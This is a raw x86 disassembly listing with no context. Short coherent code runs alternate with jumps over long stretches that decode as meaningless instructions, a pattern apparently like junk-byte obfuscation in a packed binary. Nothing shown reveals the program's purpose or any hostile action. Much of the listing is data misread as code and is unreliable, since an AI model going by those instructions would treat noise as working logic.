  423c59:	js     0x423ca9
  423c5b:	loope  0x423c9f
  423c5d:	sar    BYTE PTR [edi],0x6a
  423c60:	stos   DWORD PTR es:[edi],eax
  423c61:	call   0x22d7041f
  423c66:	cdq    
  423c67:	jmp    0x71b2:0x7b7a85a5
  423c6e:	fmul   QWORD PTR [edx]
  423c70:	mov    ecx,0x2236a19c
  423c75:	pop    edi
  423c76:	mov    BYTE PTR [edi+0x46ca2fe6],bh
  423c7c:	add    bh,BYTE PTR ds:0xd308ae86
  423c82:	push   esp
  423c83:	sub    BYTE PTR [eax+0x26],dh
  423c86:	sub    eax,0xa3dc0545
  423c8b:	int    0x63
  423c8d:	or     eax,0xf15b31d3
  423c92:	cmp    eax,0xa8889c81
  423c97:	popa   
  423c98:	or     al,0x4a
  423c9a:	iret   
  423c9b:	repz js 0x423c40
  423c9e:	add    eax,0x216eaff
  423ca3:	push   ebp
  423ca4:	fistp  WORD PTR [ecx-0x1a]
  423ca7:	push   ds
  423ca8:	pushf  
  423ca9:	pop    ss
  423caa:	pop    edx
  423cab:	pop    ds
  423cac:	shl    BYTE PTR [edx+0x113edaf7],cl
  423cb2:	stos   BYTE PTR es:[edi],al
  423cb3:	and    bh,ch
  423cb5:	stc    
  423cb6:	pop    ebp
  423cb7:	inc    ebx
  423cb8:	sahf   
  423cb9:	adc    al,0x3f
  423cbb:	loopne 0x423d08
  423cbd:	test   eax,0xcfd5a86d
  423cc2:	scas   al,BYTE PTR es:[edi]
  423cc3:	(bad)  
  423cc4:	mov    ch,0xa7
  423cc6:	dec    ecx
  423cc7:	mov    ds:0xf9a99ad3,eax
  423ccc:	sub    edx,DWORD PTR [ebp-0x16efba75]
  423cd2:	leave  
  423cd3:	add    BYTE PTR [eax],al
  423cd5:	add    BYTE PTR [eax-0x327537eb],dl
  423cdb:	(bad)  
  423cdd:	pop    ds
  423cde:	or     BYTE PTR [esi+0x7e5333ab],bl
  423ce4:	lea    esi,[ebx]
  423ce6:	jns    0x423c8d
  423ce8:	add    DWORD PTR [eax],eax
  423cea:	mov    cl,0x0
  423cec:	add    BYTE PTR [eax],al
  423cee:	sub    eax,0x561e41f4
  423cf3:	inc    esp
  423cf4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423cf5:	push   cs
  423cf6:	xor    al,0xe3
  423cf8:	mov    ebp,0xa1d262d8
  423cfd:	popa   
  423cfe:	rol    DWORD PTR [esp+eax*8+0x6f38fd88],1
  423d05:	xor    DWORD PTR [ecx-0x5b],ebx
  423d08:	dec    esp
  423d09:	lds    eax,FWORD PTR [esp+ebx*8-0x9739936]
  423d10:	out    dx,al
  423d11:	aaa    
  423d12:	call   DWORD PTR [ecx]
  423d14:	popa   
  423d15:	(bad)  
  423d16:	out    0x11,al
  423d18:	sub    bl,al
  423d1a:	das    
  423d1b:	test   al,0xd4
  423d1d:	xchg   ebp,eax
  423d1e:	inc    ebp
  423d1f:	ins    DWORD PTR es:[edi],dx
  423d20:	pop    ss
  423d21:	push   ecx
  423d22:	xchg   BYTE PTR [ebp-0xb8e2283],dh
  423d28:	and    al,0x99
  423d2a:	mov    ds:0x6205ed3a,al
  423d2f:	cmp    al,0xfb
  423d31:	lahf   
  423d32:	sub    dl,bh
  423d34:	mov    bh,BYTE PTR [eax]
  423d36:	adc    ch,BYTE PTR [edx-0x7b1fbee5]
  423d3c:	enter  0x8b4f,0xff
  423d40:	gs pop ecx
  423d42:	hlt    
  423d43:	push   es
  423d44:	das    
  423d45:	adc    dh,BYTE PTR [esi+0xeb403ab]
  423d4b:	enter  0xcdbe,0xd6
  423d4f:	ret    0xd055
  423d52:	jecxz  0x423d62
  423d54:	pop    ebp
  423d55:	pushf  
  423d56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423d57:	ss pop esi
  423d59:	push   ds
  423d5a:	gs push ss
  423d5c:	cs jmp 0x5b428e1c
  423d62:	mov    ds:0xc2ef3234,al
  423d67:	jne    0x423d45
  423d69:	out    0x89,eax
  423d6b:	xor    BYTE PTR [edi-0x412916a8],cl
  423d71:	jbe    0x423d41
  423d73:	mov    bl,0xa3
  423d75:	dec    ecx
  423d76:	daa    
  423d77:	clc    
  423d78:	xor    eax,0x8892483b
  423d7d:	sahf   
  423d7e:	add    DWORD PTR [esi+0x0],eax
  423d81:	adc    al,dh
  423d83:	sahf   
  423d84:	(bad)  
  423d85:	jl     0x423d69
  423d87:	pushf  
  423d88:	fisttp QWORD PTR [eax+0x1daeff59]
  423d8e:	jnp    0x423da1
  423d90:	mov    cl,0x9b
  423d92:	pop    esp
  423d93:	test   BYTE PTR [ebx+0x46],0x5f
  423d97:	inc    esi
  423d98:	push   ebx
  423d9a:	loop   0x423d3b
  423d9c:	jmp    0x4dcddc0f
  423da1:	adc    al,0x33
  423da3:	(bad)  
  423da4:	sub    eax,edi
  423da6:	pop    edi
  423da7:	pop    esi
  423da8:	pop    ebx
  423da9:	leave  
  423daa:	ret    0x10
  423dad:	xor    eax,eax
  423daf:	or     eax,DWORD PTR ds:0x4335ac
  423db5:	or     eax,DWORD PTR ds:0x433624
  423dbb:	mov    ds:0x4335ac,eax
  423dc0:	push   ebx
  423dc1:	sbb    eax,DWORD PTR ds:0x43356c
  423dc7:	push   esi
  423dc8:	sbb    DWORD PTR ds:0x43365c,0x6952
  423dd2:	mov    eax,DWORD PTR [esp+0x18]
  423dd6:	or     eax,eax
  423dd8:	mov    DWORD PTR ds:0x433640,0x488e
  423de2:	jmp    0x423eb9
  423de7:	jp     0x423e4d
  423de9:	inc    ebp
  423dea:	rcr    BYTE PTR [edi-0xd],cl
  423ded:	(bad)  
  423dee:	in     al,dx
  423def:	add    BYTE PTR [ebx-0x3],dh
  423df2:	imul   ecx,edi,0x2a38ea89
  423df8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423df9:	add    DWORD PTR [eax],eax
  423dfb:	mov    edx,0xe4000000
  423e00:	dec    ecx
  423e01:	fdivr  st(4),st
  423e03:	enter  0xe6e2,0xfd
  423e07:	or     edx,DWORD PTR [esp+eax*4]
  423e0a:	scas   eax,DWORD PTR es:[edi]
  423e0b:	lods   eax,DWORD PTR ds:[esi]
  423e0c:	ret    
  423e0d:	pop    edx
  423e0e:	into   
  423e0f:	mov    eax,0xeab4ace
  423e14:	inc    ebx
  423e15:	mov    ds:0xf598b37c,al
  423e1a:	and    BYTE PTR [edx-0x32],dl
  423e1d:	dec    eax
  423e1e:	mov    eax,0xd851d7a1
  423e23:	(bad)  
  423e24:	into   
  423e25:	inc    edx
  423e26:	or     cl,dh
  423e28:	in     al,dx
  423e29:	out    dx,al
  423e2a:	adc    bl,0x61
  423e2d:	and    BYTE PTR [ebp*8+0x1a40571a],0x6e
  423e35:	jecxz  0x423dd5
  423e37:	mov    esp,0xe5deff05
  423e3c:	aaa    
  423e3d:	addr16 sub eax,0x4b4ec65c
  423e43:	cwde   
  423e44:	jle    0x423dd1
  423e46:	and    cl,BYTE PTR [esi]
  423e48:	(bad)  
  423e49:	jmp    0x8630fa8e
  423e4e:	pop    esp
  423e4f:	sbb    DWORD PTR [ecx+0x2442bb73],ebp
  423e55:	xlat   BYTE PTR ds:[ebx]
  423e56:	cld    
  423e57:	pop    esp
  423e58:	mov    al,0xde
  423e5a:	xor    eax,0xdbff64a9
  423e5f:	pushf  
  423e60:	leave  
  423e61:	xchg   edx,eax
  423e62:	stos   BYTE PTR es:[edi],al
  423e63:	ja     0x423e18
  423e65:	daa    
  423e66:	mov    edx,0x39e19b6d
  423e6b:	pusha  
  423e6c:	mov    bl,0xaa
  423e6e:	inc    ecx
  423e6f:	fild   QWORD PTR [ebx-0x32f59b2e]
  423e75:	iret   
  423e76:	dec    edi
  423e77:	mov    al,ds:0xea4dd82d
  423e7c:	mov    cs,edi
  423e7e:	mov    cs,esi
  423e80:	adc    DWORD PTR [ebx-0x5247c21],esi
  423e86:	inc    edi
  423e87:	xchg   DWORD PTR [ebx+0x5bb50edd],eax
  423e8d:	popa   
  423e8e:	les    ecx,FWORD PTR [eax+0x306ccdeb]
  423e94:	aas    
  423e95:	inc    ebx
  423e96:	ret    0xf758
  423e99:	je     0x423ed9
  423e9b:	call   0xb611:0x807c6dbf
  423ea2:	xchg   ecx,ebx
  423ea4:	loopne 0x423edc
  423ea6:	int    0x91
  423ea8:	dec    ebp
  423ea9:	mov    esi,cs
  423eab:	mov    edx,0xb0b53104
  423eb0:	jb     0x423f21
  423eb2:	outs   dx,BYTE PTR ds:[esi]
  423eb3:	or     bh,0xe2
  423eb6:	cmp    al,0x9f
  423eb8:	push   esi
  423eb9:	jne    0x42419e
  423ebf:	mov    ecx,DWORD PTR [esp+0x14]
  423ec3:	mov    eax,DWORD PTR [esp+0x10]
  423ec7:	movzx  ebx,WORD PTR ds:0x4335c4
  423ece:	sub    ebx,DWORD PTR ds:0x4335f4
  423ed4:	mov    DWORD PTR ds:0x4335c4,ebx
  423eda:	xor    edx,edx
  423edc:	cmp    DWORD PTR ds:0x4335bc,0x0
  423ee3:	jge    0x423f08
  423ee9:	xor    DWORD PTR ds:0x4335cc,edx
  423eef:	jmp    0x423f08
  423ef4:	push   DWORD PTR [ebp-0x18]
  423ef7:	push   DWORD PTR [ebp-0x18]
  423efa:	push   DWORD PTR [ebp-0x1c]
  423efd:	push   0x7df4
  423f02:	call   DWORD PTR ds:0x43c7d8
  423f08:	div    ecx
  423f0a:	jmp    0x423fe1
  423f0f:	lock xchg ebx,eax
  423f11:	out    dx,al
  423f12:	and    eax,0xd7fb7def
  423f17:	dec    edi
  423f18:	arpl   WORD PTR [edi],si
  423f1a:	xchg   edx,eax
  423f1b:	int    0x4f
  423f1d:	dec    esp
  423f1e:	in     al,0xe4
  423f20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423f21:	add    DWORD PTR [eax],eax
  423f23:	mov    edx,0x7000000
  423f28:	rcl    DWORD PTR [ebx+0x3891c1ea],1
  423f2e:	in     al,0x95
  423f30:	ins    DWORD PTR es:[edi],dx
  423f31:	jb     0x423f00
  423f33:	outs   dx,BYTE PTR fs:[esi]
  423f35:	mov    WORD PTR [ebx-0x6b],es
  423f38:	add    al,0x3c
  423f3a:	(bad)  
  423f3b:	out    0x43,al
  423f3d:	sub    DWORD PTR [eax-0x5f5b51dd],ebp
  423f43:	repnz cmp eax,0xb10c872f
  423f49:	(bad)  
  423f4a:	in     al,dx
  423f4b:	in     al,dx
  423f4c:	dec    BYTE PTR [esi]
  423f4e:	ret    0x3769
  423f51:	stos   DWORD PTR es:[edi],eax
  423f52:	out    0xd5,al
  423f54:	and    eax,0xf98181b1
  423f59:	fwait
  423f5a:	push   edx
  423f5b:	iret   
  423f5c:	hlt    
  423f5d:	add    ch,cl
  423f5f:	ja     0x423fb1
  423f61:	(bad)  
  423f62:	and    eax,DWORD PTR [eax+0x7501a44e]
  423f68:	leave  
  423f69:	xchg   ebp,eax
  423f6a:	cmp    BYTE PTR [ebp+eiz*8+0x23],dl
  423f6e:	jb     0x423fef
  423f70:	scas   al,BYTE PTR es:[edi]
  423f71:	mov    eax,ds:0xeec535c8
  423f76:	ror    BYTE PTR [esi-0x5e],1
  423f79:	pop    edx
  423f7a:	and    DWORD PTR [edi+0x5bb6eb2a],edi
  423f80:	mul    eax
  423f82:	retf   
  423f83:	push   edi
  423f84:	mov    dl,bh
  423f86:	adc    al,0xf7
  423f88:	lahf   
  423f89:	sahf   
  423f8a:	call   0x5c2:0xaae8e7a
  423f91:	cmp    bh,BYTE PTR [edx-0x74c73716]
  423f97:	mov    bh,0x24
  423f99:	mov    cl,BYTE PTR [edx-0x3c9c83fd]
  423f9f:	or     BYTE PTR [ebx],cl
  423fa1:	pop    esi
  423fa2:	jmp    0xd239f5df
  423fa7:	aam    0xd5
  423fa9:	call   0x7bf55488
  423fae:	out    dx,al
  423faf:	nop
  423fb0:	mov    edx,0x1d5088b7
  423fb5:	and    al,BYTE PTR [edx+0x2989bedb]
  423fbb:	inc    ebp
  423fbc:	out    dx,al
  423fbd:	xor    al,0x41
  423fbf:	add    eax,0x170a5c61
  423fc4:	mov    ebp,0xb967d89a
  423fc9:	mov    DWORD PTR [edx-0x6ca4e3d5],ebx
  423fcf:	sbb    eax,0x9a6b335a
  423fd4:	inc    edi
  423fd5:	adc    esi,DWORD PTR [edi-0x680855e4]
  423fdb:	pop    esi
  423fdc:	ret    
  423fdd:	aaa    
  423fde:	data16 jp 0x424013
  423fe1:	mov    ebx,eax
  423fe3:	jmp    0x4240ba
  423fe8:	hlt    
  423fe9:	and    edi,DWORD PTR [esi-0x16200f0]
  423fef:	out    0xff,eax
  423ff1:	push   0x168ee4af
  423ff6:	push   esp
  423ff7:	or     eax,0x1a79e
  423ffc:	mov    edx,0x79000000
  424001:	loopne 0x423fa2
  424003:	xor    ebp,DWORD PTR [edx-0x7b]
  424006:	call   0x84eb:0x1eb0820e
  42400d:	leave  
  42400e:	mov    ebp,0x916addd6
  424013:	sbb    ebx,DWORD PTR [esi-0x3e]
  424016:	ret    0x1c76
  424019:	popf   
  42401a:	or     eax,0xf5609209
  42401f:	dec    ebx
  424020:	pop    ebp
  424021:	iret   
  424022:	jno    0x42406f
  424024:	push   edi
  424025:	inc    eax
  424026:	add    al,0xd
  424028:	lods   eax,DWORD PTR ds:[esi]
  424029:	push   esp
  42402a:	loop   0x4240a5
  42402c:	cld    
  42402d:	jmp    0x1b5d:0xa398a64
  424034:	(bad)
  424037:	push   0x5d368611
  42403c:	icebp  
  42403d:	sahf   
  42403e:	jb     0x423fd4
  424040:	sub    eax,0xe6d8d046
  424045:	mov    esi,0x83ac37ec
  42404a:	fcmovu st,st(4)
  42404c:	push   ebp
  42404d:	pop    edi
  42404e:	jne    0x4240ab
  424050:	call   0x6b68:0x120cb4ee
  424057:	mov    bh,0x6
  424059:	ja     0x423ff4
  42405b:	retf   
  42405c:	lods   al,BYTE PTR ds:[esi]
  42405d:	das    
  42405e:	jo     0x42403c
  424060:	or     DWORD PTR [eax],0xffffffca
  424063:	in     al,dx
  424064:	retf   0x1920
  424067:	sar    esi,1
  424069:	stos   DWORD PTR es:[edi],eax
  42406a:	dec    eax
  42406b:	or     DWORD PTR [ebx-0x7bc2cbba],0xd6a969e6
  424075:	xor    BYTE PTR [edx+0x6acbc9c2],cl
  42407b:	jl     0x42404f
  42407d:	fst    st(4)
  42407f:	mov    al,0x4
  424081:	js     0x424071
  424083:	inc    eax
  424084:	data16 and BYTE PTR [ecx+0x3afdf82b],0xd2
  42408c:	pop    ebx
  42408d:	dec    eax
  42408e:	jne    0x4240e9
  424090:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424091:	jge    0x424099
  424093:	adc    BYTE PTR [ebx+0x2c334164],cl
  424099:	leave  
  42409a:	dec    esi
  42409b:	and    dh,bh
  42409d:	mov    al,0xfb
  42409f:	dec    esp
  4240a0:	push   edx
  4240a1:	fidiv  DWORD PTR [edi-0x41]
  4240a4:	jge    0x424082
  4240a6:	xchg   BYTE PTR ds:0xaab9fd5e,bh
  4240ac:	scas   eax,DWORD PTR es:[edi]
  4240ad:	in     al,dx
  4240ae:	mov    ch,0x31
  4240b0:	pop    eax
  4240b1:	ja     0x42409f
  4240b3:	inc    edx
  4240b4:	sub    dh,BYTE PTR ds:0x6a4d6781
  4240ba:	mov    eax,DWORD PTR [esp+0xc]
  4240be:	jmp    0x424195
  4240c3:	fimul  WORD PTR [ebx]
  4240c5:	clc    
  4240c6:	cdq    
  4240c7:	std    
  4240c8:	sti    
  4240c9:	dec    DWORD PTR [edi-0x79]
  4240cc:	fsubr  QWORD PTR [eax]
  4240ce:	fisub  WORD PTR [ecx+eax*2]
  4240d1:	mov    dl,0x95
  4240d3:	pop    eax
  4240d4:	test   al,0x1
  4240d6:	add    BYTE PTR [edx-0x21000000],bh
  4240dc:	cwde   
  4240dd:	dec    esp
  4240de:	inc    BYTE PTR [ebx]
  4240e0:	push   edx
  4240e1:	sub    al,0x2e
  4240e3:	xchg   edx,eax
  4240e4:	xor    ebp,DWORD PTR [eax+esi*8+0x703886a9]
  4240eb:	mov    eax,0xfc9408c
  4240f0:	push   edi
  4240f1:	std    
  4240f2:	mov    dh,0xdf
  4240f4:	popf   
  4240f5:	inc    ecx
  4240f6:	dec    esi
  4240f7:	xlat   BYTE PTR ds:[ebx]
  4240f8:	test   esi,eax
  4240fa:	push   cs
  4240fb:	push   ecx
  4240fc:	scas   al,BYTE PTR es:[edi]
  4240fd:	shr    esi,0x66
  424100:	addr16 data16 (bad) 
  424103:	xchg   DWORD PTR [ebx+esi*2-0x1d],edx
  424107:	bound  eax,QWORD PTR [ecx+0x1fc2ff66]
  42410d:	add    cl,BYTE PTR [ecx-0x43848621]
  424113:	sbb    eax,DWORD PTR [ebp+0x7f591e72]
  424119:	fisub  DWORD PTR [edi+0x71]
  42411c:	sbb    esi,0x6f90f334
  424122:	pop    ebp
  424123:	(bad)  
  424124:	(bad)  
  424125:	retf   
  424126:	fldenv [ecx-0x6b]
  424129:	xor    al,0x37
  42412b:	xor    bl,bl
  42412d:	mov    DWORD PTR [ebx],ecx
  42412f:	sbb    edi,DWORD PTR [ebx-0x5808d15e]
  424135:	aad    0x1c
  424137:	xor    eax,0xd6427cd1
  42413c:	sub    al,0xc8
  42413e:	and    al,BYTE PTR [esi+eax*1]
  424141:	out    dx,eax
  424142:	loop   0x4240d8
  424144:	adc    BYTE PTR [eax+0x59d8d455],bh
  42414a:	cmp    ebx,DWORD PTR [ebp-0x53ad3e6d]
  424150:	out    0x3f,al
  424152:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424153:	popa   
  424154:	loopne 0x424184
  424156:	clc    
  424157:	add    eax,ebx
  424159:	in     al,0xf
  42415b:	imul   eax,DWORD PTR [edi-0x19],0xdebdafa3
  424162:	and    DWORD PTR [esi-0x4d],ebp
  424165:	cmp    al,0x3c
  424167:	cmp    DWORD PTR [edi-0x4f],esp
  42416a:	int    0x59
  42416c:	jne    0x42413c
  42416e:	out    0x88,al
  424170:	mov    dh,0x82
  424172:	test   eax,0x30540b85
  424177:	lods   eax,DWORD PTR ds:[esi]
  424178:	jns    0x424140
  42417a:	(bad)  
  42417c:	inc    eax
  42417d:	inc    ebp
  42417e:	pop    ebx
  42417f:	adc    eax,0x638951ac
  424184:	xchg   ebp,eax
  424185:	push   edx
  424186:	ret    
  424187:	mov    dh,BYTE PTR [ebx+0x61]
  42418a:	popa   
  42418b:	pop    edx
  42418c:	daa    
  42418d:	std    
  42418e:	sbb    BYTE PTR [esi],dh
  424190:	sar    ebp,cl
  424192:	rcl    BYTE PTR [edx+ebp*2-0x2c740e09],1
  424199:	jmp    0x4248ca
  42419e:	mov    ecx,eax
  4241a0:	sub    eax,0x5595
  4241a5:	mov    ebx,DWORD PTR [esp+0x14]
  4241a9:	mov    edx,DWORD PTR [esp+0x10]
  4241ad:	or     eax,DWORD PTR ds:0x433538
  4241b3:	jmp    0x42428a
  4241b8:	and    bh,al
  4241ba:	dec    eax
  4241bb:	sub    dl,bl
  4241bd:	mov    eax,0xbd00fa62
  4241c2:	fistp  QWORD PTR [edi]
  4241c4:	ror    edx,cl
  4241c6:	div    BYTE PTR [ebx]
  4241c8:	adc    ch,BYTE PTR [ecx+0xba0001]
  4241ce:	add    BYTE PTR [eax],al
  4241d0:	xor    ch,BYTE PTR [ebp+edx*4-0x1500fe1a]
  4241d7:	fstp   DWORD PTR [ebx+0x58]
  4241da:	or     ch,BYTE PTR [eax+0x19]
  4241dd:	mov    ecx,0xcf4a4fd8
  4241e2:	sub    eax,0x35b3b063
  4241e7:	iret   
  4241e8:	pop    es
  4241e9:	push   esi
  4241ea:	jo     0x4241f4
  4241ec:	mov    ebx,DWORD PTR [esi+0x47]
  4241ef:	sub    eax,0x5859d015
  4241f4:	jl     0x424233
  4241f6:	aad    0xa7
  4241f8:	xlat   BYTE PTR ds:[ebx]
  4241f9:	push   es
  4241fa:	jno    0x42425b
  4241fc:	add    al,0x73
  4241fe:	arpl   WORD PTR [eax-0x73],bp
  424201:	mov    eax,ds:0x39381284
  424206:	mov    bh,BYTE PTR [ecx-0x73]
  424209:	aad    0x3a
  42420b:	fwait
  42420c:	and    DWORD PTR [ebp+0x6e],esp
  42420f:	scas   al,BYTE PTR es:[edi]
  424210:	mov    ah,0xdc
  424212:	pop    ss
  424213:	popf   
  424214:	sbb    BYTE PTR [edx],bl
  424216:	inc    edi
  424217:	push   eax
  424218:	inc    ebx
  424219:	or     BYTE PTR [esi-0x423da96],bh
  42421f:	mov    bl,ah
  424221:	dec    esp
  424222:	pop    edi
  424223:	adc    edx,DWORD PTR ss:[esi]
  424226:	mov    dh,0x4
  424228:	(bad)  
  424229:	cmp    dh,BYTE PTR [eax+0x104675e6]
  42422f:	xchg   DWORD PTR [ecx-0x2c857271],ecx
  424235:	lods   eax,DWORD PTR ds:[esi]
  424236:	push   esp
  424237:	lds    edi,FWORD PTR [ecx]
  424239:	pusha  
  42423a:	xchg   edx,eax
  42423b:	fsubr  QWORD PTR [edi]
  42423d:	or     al,0x93
  42423f:	scas   al,BYTE PTR es:[edi]
  424240:	sub    bl,0x6e
  424243:	scas   al,BYTE PTR es:[edi]
  424244:	iret   
  424245:	daa    
  424246:	sbb    edi,DWORD PTR [esi]
  424248:	outs   dx,BYTE PTR ds:[esi]
  424249:	je     0x4242b0
  42424b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42424c:	repz jb 0x424232
  42424f:	adc    al,0xec
  424251:	int3   
  424252:	adc    esp,DWORD PTR [ebx]
  424254:	xor    DWORD PTR [ebp+0x5b],ebx
  424257:	cmp    ah,BYTE PTR [esi+0x4e]
  42425a:	mov    bl,0xaa
  42425c:	popa   
  42425d:	mov    ebx,0x8a717655
  424262:	adc    al,0xe8
  424264:	aas    
  424265:	sar    DWORD PTR [eax],0xb5
  424268:	in     eax,dx
  424269:	fcomp  DWORD PTR [ecx]
  42426b:	out    0xea,eax
  42426d:	shl    DWORD PTR [esi],cl
  42426f:	ja     0x42420b
  424271:	pop    esi
  424272:	push   cs
  424273:	pop    ebx
  424274:	jg     0x424255
  424276:	stos   DWORD PTR es:[edi],eax
  424277:	(bad)  
  424278:	(bad)  
  424279:	aad    0x1
  42427b:	mov    ch,0x98
  42427d:	das    
  42427e:	icebp  
  42427f:	test   DWORD PTR [edx-0x13],esp
  424282:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424283:	iret   
  424284:	and    eax,0x723c69a3
  424289:	das    
  42428a:	mov    eax,DWORD PTR [esp+0xc]
  42428e:	add    DWORD PTR ds:0x4335f0,0x433564
  424298:	shr    ecx,1
  42429a:	mov    DWORD PTR ds:0x4335d4,0x39ce
  4242a4:	rcr    ebx,1
  4242a6:	shr    edx,1
  4242a8:	jmp    0x42437f
  4242ad:	imul   al
  4242af:	jbe    0x4242ef
  4242b1:	jle    0x424271
  4242b3:	(bad)  
  4242b4:	call   0xc7a5279d
  4242b9:	and    DWORD PTR es:[ebx+esi*1-0x34],eax
  4242be:	test   eax,0xba0001
  4242c3:	add    BYTE PTR [eax],al
  4242c5:	push   es
  4242c6:	push   ds
  4242c7:	sahf   
  4242c8:	leave  
  4242c9:	mov    ds:0xc2f8d6a6,al
  4242ce:	dec    esi
  4242cf:	shl    DWORD PTR [eax+0x7b08bf06],cl
  4242d5:	push   esi
  4242d6:	std    
  4242d7:	(bad)  
  4242d8:	mov    esp,0xdd489b7e
  4242dd:	popf   
  4242de:	add    BYTE PTR [esi-0x1a2190fd],ch
  4242e4:	or     al,0xb4
  4242e6:	jmp    0x7db0eb67
  4242eb:	call   0xaa941b7d
  4242f0:	mov    al,0xa8
  4242f2:	inc    ecx
  4242f3:	push   0x760ee2a9
  4242f8:	xor    BYTE PTR [eax+0x44],dh
  4242fb:	rol    BYTE PTR [ebp-0x52],0x19
  4242ff:	xchg   DWORD PTR [eax+eax*8+0x19],ebx
  424303:	into   
  424304:	pop    eax
  424305:	xor    eax,0xc165e309
  42430a:	pusha  
  42430b:	jp     0x4242e8
  42430d:	stos   BYTE PTR es:[edi],al
  42430e:	xlat   BYTE PTR ds:[ebx]
  42430f:	add    cl,BYTE PTR [ebx-0x9]
  424312:	xchg   DWORD PTR [edx-0x2a8284dc],ebp
  424318:	jle    0x4242c4
  42431a:	ss mov ebp,0x2c605b02
  424320:	inc    esi
  424321:	(bad)  
  424322:	in     eax,dx
  424323:	and    ebp,eax
  424325:	and    DWORD PTR [ecx+0x17e127c3],ecx
  42432b:	push   0x77
  42432d:	adc    ecx,DWORD PTR [ebx]
  42432f:	in     eax,0xcb
  424331:	mov    ebx,0xc01d59f2
  424336:	mov    WORD PTR [edi],cs
  424338:	div    BYTE PTR [ebx+0x5f6857bf]
  42433e:	adc    eax,0x82f22ac6
  424343:	call   0x9ccf6f7c
  424348:	or     al,BYTE PTR [ebx+esi*4+0x4]
  42434c:	shl    al,cl
  42434e:	popf   
  42434f:	stc    
  424350:	retf   
  424351:	mov    eax,0x75207ca4
  424356:	mov    eax,ds:0xa49cc67f
  42435b:	retf   0xa2b4
  42435e:	scas   al,BYTE PTR es:[edi]
  42435f:	and    DWORD PTR [esi-0x2e4cab80],0xfffffff4
  424366:	xor    al,0xc7
  424368:	lock jmp 0x424304
  42436b:	and    dl,BYTE PTR [edx-0x42fb5884]
  424371:	jne    0x424354
  424373:	std    
  424374:	(bad)  fs:0x6581b180
  42437b:	(bad)  
  42437c:	shr    BYTE PTR [esi],1
  42437e:	dec    esp
  42437f:	rcr    eax,1
  424381:	or     ecx,ecx
  424383:	jne    0x42428e
  424389:	div    ebx
  42438b:	jmp    0x424462
  424390:	xor    BYTE PTR [ebx],ah
  424392:	mov    ebx,0x3ab9bbb1
  424397:	mov    ds:0xf33061d,eax
  42439c:	jecxz  0x4243a9
  42439e:	icebp  
  42439f:	ret    
  4243a0:	xchg   BYTE PTR [edx+0xba0001],ch
  4243a6:	add    BYTE PTR [eax],al
  4243a8:	pop    ecx
  4243a9:	inc    esi
  4243aa:	iret   
  4243ab:	inc    esp
  4243ac:	inc    ecx
  4243ad:	jg     0x42437d
  4243af:	push   esp
  4243b0:	mov    al,ds:0x4fccc489
  4243b5:	sbb    DWORD PTR [esi+0x4d0c67f2],0xc81cbbf4
  4243bf:	popf   
  4243c0:	mov    al,ds:0x8ac875e5
  4243c6:	dec    ebp
  4243c7:	cmp    BYTE PTR [edx-0x50],ah
  4243ca:	jbe    0x4243c6
  4243cc:	jmp    0x42437d
  4243ce:	fwait
  4243cf:	xor    DWORD PTR [ebx-0x3f],0xffffffc6
  4243d3:	mov    ebp,0x8ad9fce2
  4243d8:	pop    eax
  4243d9:	mov    esi,0x36cf7f7c
  4243de:	aad    0xd
  4243e0:	fcom   QWORD PTR [eax]
  4243e2:	mov    ebp,0x9d7f415a
  4243e7:	pop    esi
  4243e8:	mov    edx,0x2683e096
  4243ed:	or     eax,0xf5fce5ce
  4243f2:	and    al,0xbc
  4243f4:	lock in al,dx
  4243f6:	clc    
  4243f7:	cdq    
  4243f8:	in     al,0x91
  4243fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4243fb:	jp     0x424451
  4243fd:	loopne 0x424447
  4243ff:	sbb    DWORD PTR [edx],edi
  424401:	idiv   BYTE PTR [eax+0x6c]
  424404:	les    esp,FWORD PTR [edi-0x6f]
  424407:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424408:	push   ebx
  424409:	xor    ebx,DWORD PTR [ebp-0x60]
  42440c:	cmp    eax,0x362b89e7
  424411:	into   
  424412:	call   0x2ce83fd9
  424417:	add    eax,0x3dd37333
  42441c:	pop    esp
  42441d:	sub    DWORD PTR [eax+0x7a5e6c1c],eax
  424423:	push   ds
  424424:	inc    ebx
  424425:	jmp    0x61991201
  42442a:	(bad)  
  42442b:	sbb    eax,0x55d2a338
  424430:	sub    esi,edi
  424432:	pop    ecx
  424433:	cmp    ecx,DWORD PTR [eax+0x7cf0a373]
  424439:	cwde   
  42443a:	sbb    bh,BYTE PTR [esi-0x66b8e06c]
  424440:	sub    BYTE PTR [edi],cl
  424442:	xlat   BYTE PTR ds:[ebx]
  424443:	jmp    0x42447a
  424445:	xor    edi,esi
  424447:	out    dx,al
  424448:	cmc    
  424449:	out    0x56,al
  42444b:	mov    al,ds:0x4e610f50
  424450:	mov    ds:0x701e9626,eax
  424455:	dec    edx
  424456:	mov    dl,0x6b
  424458:	and    eax,0x7e96a9be
  42445d:	dec    ebx
  42445e:	nop
  42445f:	cmp    eax,0xf08b30ee
  424464:	jmp    0x42453b
  424469:	nop
  42446a:	fs sub eax,0xd4e9fde9
  424470:	jge    0x42445c
  424472:	cmp    dh,BYTE PTR [edi]
  424474:	xor    edx,ebx
  424476:	and    cl,BYTE PTR [ebp+0x1ab409f]
  42447c:	add    BYTE PTR [edx+0x4a000000],bh
  424482:	and    ecx,DWORD PTR [ebx+0x11]
  424485:	es (bad) 
  424487:	aad    0xcf
  424489:	out    dx,eax
  42448a:	daa    
  42448b:	(bad)  
  42448c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42448d:	out    dx,al
  42448e:	mov    esi,0xbcd6648c
  424493:	sub    ebp,edi
  424495:	or     al,0xca
  424497:	aad    0xe8
  424499:	shl    DWORD PTR [edi],1
  42449b:	sbb    BYTE PTR [ecx-0x5f],ah
  42449e:	jne    0x424492
  4244a0:	pop    eax
  4244a1:	cwde   
  4244a2:	or     edi,ebp
  4244a4:	imul   ebx,ecx,0xe43c4e57
  4244aa:	mov    DWORD PTR ds:0x4bf74296,esi
  4244b0:	lds    edi,FWORD PTR [ebx]
  4244b2:	pop    ss
